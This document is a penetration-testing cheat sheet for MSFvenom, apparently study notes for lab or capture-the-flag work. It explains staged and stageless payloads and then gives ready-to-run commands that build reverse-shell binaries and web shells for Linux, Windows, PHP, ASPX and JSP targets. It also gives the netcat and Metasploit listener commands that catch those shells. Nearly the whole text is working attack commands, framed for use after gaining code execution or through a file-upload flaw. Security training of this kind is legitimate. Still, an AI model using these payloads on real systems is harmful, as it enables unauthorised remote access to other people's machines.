# MSFvenom (Payload Generation)
**Role:** Standalone Payload Generator. 
**Key Insight:** MSFvenom combines the old `msfpayload` and `msfencode` tools. It creates malicious binaries (EXE, ELF) or raw shellcode (Python, PHP) that you execute on the target to get a reverse shell.
## 1. Core Concept: Staged vs. Stageless
**Critical:** You must match your payload type to your listener.

| **Type**      | **Naming Convention**           | **Description**                                                                             | **Listener**                             |
| ------------- | ------------------------------- | ------------------------------------------------------------------------------------------- | ---------------------------------------- |
| *Stageless* | `_` (e.g., `shell_reverse_tcp`) | **Complete Payload.** The entire shellcode is in the file. Larger size, but stable.         | **Netcat** (`nc -lvnp`)                  |
| *Staged*    | `/` (e.g., `shell/reverse_tcp`) | **Tiny Stager.** Connects back, downloads the rest of the shell from memory, then executes. | **Metasploit** (`exploit/multi/handler`) |
## 2. Basic Syntax
```shell
# Syntax:
# -p: Payload
# LHOST: Your IP (VPN)
# LPORT: Your Listener Port
# -f: Output Format (exe, elf, raw, python)
# -o: Output File

msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
## 3. Linux Payloads (ELF)
**Context:** You have RCE on a Linux machine and want a stable shell.

**Stageless (Netcat Compatible):**
```shell
# Generate
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o shell.elf

# Handler (Attacker)
sudo nc -lvnp 443
```

**Staged (Metasploit Compatible):**
```shell
# Generate
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o shell.elf

# Handler (Attacker)
# Requires 'use exploit/multi/handler' in msfconsole
```
## 4. Windows Payloads (EXE)
**Context:** You have RDP or SMB access and can upload an executable.

**Stageless (Netcat Compatible):**
```shell
# Generate
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe
```

**Staged Meterpreter (The Standard):**
```shell
# Generate (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe
```
## 5. Web Payloads (Scripts)
**Context:** You found an Arbitrary File Upload vulnerability in a web app.

**PHP (WordPress/Joomla):**
```shell
# Generate raw PHP code
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=443 -f raw > shell.php
```

**ASPX (IIS/Windows):**
```shell
# Generate ASPX shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o shell.aspx
```

**JSP (Tomcat/Java):**
```shell
# Generate JSP shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw > shell.jsp
```
## 6. Listeners (How to Catch Shells)
### Netcat (For Stageless Payloads)
**Use this for:** `shell_reverse_tcp`, `php/reverse_php`
```shell
sudo nc -lvnp 443
```
### Metasploit Handler (For Staged Payloads)
**Use this for:** `meterpreter/reverse_tcp`
```shell
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp  <-- MUST MATCH YOUR GENERATED PAYLOAD
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 443
msf6 > run
```